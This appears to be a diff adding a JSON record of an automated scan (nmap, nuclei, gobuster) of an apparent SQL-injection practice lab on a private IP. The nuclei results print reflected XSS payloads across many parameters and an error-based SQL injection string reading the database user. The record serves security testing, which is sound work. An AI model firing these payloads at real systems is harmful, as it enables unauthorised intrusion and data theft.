@@ -1,0 +1,77 @@
+{
+  "id": "8a309a25-5b75-462b-bf60-ebb0183511e8",
+  "target": "192.168.1.114:89/Less-1/?id=1",
+  "status": "completed",
+  "tasks": [
+    {
+      "id": "a6155f2c-99d6-4dc7-8683-6c2e1b352986",
+      "tool_name": "nmap",
+      "params": {
+        "ports": "top-1000",
+        "target": "192.168.1.114:89/Less-1/?id=1"
+      },
+      "status": "completed",
+      "result": {
+        "stderr": "Unable to split netmask from target expression: \"192.168.1.114:89/Less-1/?id=1\"\nWARNING: No targets were specified, so 0 hosts scanned.\n",
+        "stdout": "Starting Nmap 7.91 ( https://nmap.org ) at 2026-04-12 00:29 EDT\nNmap done: 0 IP addresses (0 hosts up) scanned in 0.02 seconds\n",
+        "command": "nmap -T3 --top-ports 1000 192.168.1.114:89/Less-1/?id=1",
+        "success": true,
+        "timed_out": false,
+        "return_code": 0
+      },
+      "dependencies": [],
+      "error": null,
+      "created_at": "2026-04-12T00:29:39.285584",
+      "started_at": "2026-04-12T00:29:39.295122",
+      "completed_at": "2026-04-12T00:29:39.334354"
+    },
+    {
+      "id": "f81dc510-3b05-4a5d-8f5a-56f1aa38d521",
+      "tool_name": "nuclei",
+      "params": {
+        "target": "http://192.168.1.114:89/Less-1/?id=1"
+      },
+      "status": "completed",
+      "result": {
+        "stderr": "\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.7.0\n\n\t\tprojectdiscovery.io\n\n[\u001b[34mINF\u001b[0m] Your current nuclei-templates v10.3.9 are outdated. Latest is v10.4.1\n[\u001b[34mINF\u001b[0m] Current nuclei version: v3.7.0 (\u001b[91moutdated\u001b[0m)\n[\u001b[34mINF\u001b[0m] Current nuclei-templates version: v10.3.9 (\u001b[91moutdated\u001b[0m)\n[\u001b[34mINF\u001b[0m] New templates added in latest release: 182\n[\u001b[34mINF\u001b[0m] Templates loaded for current scan: 9810\n[\u001b[34mINF\u001b[0m] Executing 9808 signed templates from projectdiscovery/nuclei-templates\n[\u001b[34mINF\u001b[0m] Targets loaded for current scan: 1\n[\u001b[34mINF\u001b[0m] Templates clustered: 2237 (Reduced 2113 Requests)\n[\u001b[34mINF\u001b[0m] Using Interactsh Server: oast.online\n[\u001b[34mINF\u001b[0m] Skipped 192.168.1.114:4040 from target list as found unresponsive permanently: cause=\"port closed or filtered\" address=192.168.1.114:4040 chain=\"connection refused; got err while executing http://192.168.1.114:4040/Less-1/jobs/?id=1\"\n[\u001b[34mINF\u001b[0m] Scan completed in 5m. 20 matches found.\n",
+        "stdout": "[\u001b[93mWRN\u001b[0m] Loading 2 unsigned templates for scan. Use with caution.\n[\u001b[92mwaf-detect\u001b[0m:\u001b[1;92mapachegeneric\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1&id=1\n[\u001b[92mxss-fuzz\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[33mmedium\u001b[0m] http://192.168.1.114:89/Less-1/?id=1&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id%27%29%3E&image=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-image%27%29%3E&order=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order%27%29%3E&sid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sid%27%29%3E&language=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-language%27%29%3E&filter=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-filter%27%29%3E&import=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-import%27%29%3E&st=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-st%27%29%3E&act=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-act%27%29%3E&object=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-object%27%29%3E&insert=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-insert%27%29%3E&task=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-task%27%29%3E&dismiss=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dismiss%27%29%3E&orderby=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-orderby%27%29%3E [\u001b[93mxss_param\u001b[0m=\u001b[93m\"image=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-image%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id%27%29%3E&order=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order%27%29%3E&sid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sid%27%29%3E&language=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-language%27%29%3E&filter=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-filter%27%29%3E&import=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-import%27%29%3E&st=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-st%27%29%3E&act=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-act%27%29%3E&object=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-object%27%29%3E&insert=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-insert%27%29%3E&task=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-task%27%29%3E&dismiss=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dismiss%27%29%3E&orderby=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-orderby%27%29%3E\"\u001b[0m]\n[\u001b[92mapache-detect\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1 [\u001b[96m\"Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\"\u001b[0m]\n[\u001b[92mphp-eol\u001b[0m:\u001b[1;92mversion\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1 [\u001b[96m\"5.4.45\"\u001b[0m]\n[\u001b[92mopenssl-detect\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1 [\u001b[96m\"OpenSSL/1.1.1b\"\u001b[0m]\n[\u001b[92mphp-detect\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1 [\u001b[96m\"5.4.45\"\u001b[0m]\n[\u001b[92mtop-xss-params\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[38;5;208mhigh\u001b[0m] http://192.168.1.114:89/Less-1/?id=1&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mpermissions-policy\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mx-frame-options\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mx-content-type-options\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mx-permitted-cross-domain-policies\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mreferrer-policy\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mclear-site-data\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mcross-origin-embedder-policy\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mcross-origin-opener-policy\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mstrict-transport-security\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mcontent-security-policy\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92mhttp-missing-security-headers\u001b[0m:\u001b[1;92mcross-origin-resource-policy\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n[\u001b[92myeswiki-sql\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[31mcritical\u001b[0m] http://192.168.1.114:89/Less-1/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&PagePrincipale/rss\n[\u001b[92mtech-detect\u001b[0m:\u001b[1;92mphp\u001b[0m] [\u001b[94mhttp\u001b[0m] [\u001b[34minfo\u001b[0m] http://192.168.1.114:89/Less-1/?id=1\n",
+        "command": "nuclei -target http://192.168.1.114:89/Less-1/?id=1 -rate-limit 50",
+        "success": true,
+        "timed_out": false,
+        "return_code": 0
+      },
+      "dependencies": [
+        "a6155f2c-99d6-4dc7-8683-6c2e1b352986"
+      ],
+      "error": null,
+      "created_at": "2026-04-12T00:29:39.334532",
+      "started_at": "2026-04-12T00:29:39.800646",
+      "completed_at": "2026-04-12T00:36:07.171160"
+    },
+    {
+      "id": "4010a383-f954-438c-85eb-15fe81f5afcf",
+      "tool_name": "gobuster",
+      "params": {
+        "url": "http://192.168.1.114:89/Less-1/?id=1"
+      },
+      "status": "completed",
+      "result": {
+        "stderr": "",
+        "stdout": "===============================================================\nGobuster v3.8.2\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.1.114:89/Less-1/?id=1\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.8.2\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n.htaccess            (Status: 403) [Size: 344]\n.htpasswd            (Status: 403) [Size: 344]\n.hta                 (Status: 403) [Size: 339]\nindex.php            (Status: 200) [Size: 767]\nnul                  (Status: 403) [Size: 338]\n===============================================================\nFinished\n===============================================================\n",
+        "command": "gobuster dir -u http://192.168.1.114:89/Less-1/?id=1 -w /usr/share/wordlists/dirb/common.txt -t 10",
+        "success": true,
+        "timed_out": false,
+        "return_code": 0
+      },
+      "dependencies": [
+        "a6155f2c-99d6-4dc7-8683-6c2e1b352986"
+      ],
+      "error": null,
+      "created_at": "2026-04-12T00:29:39.334547",
+      "started_at": "2026-04-12T00:29:39.805054",
+      "completed_at": "2026-04-12T00:29:41.776181"
+    }
+  ],
+  "created_at": "2026-04-12T00:29:39.285558",
+  "assets": []
+}
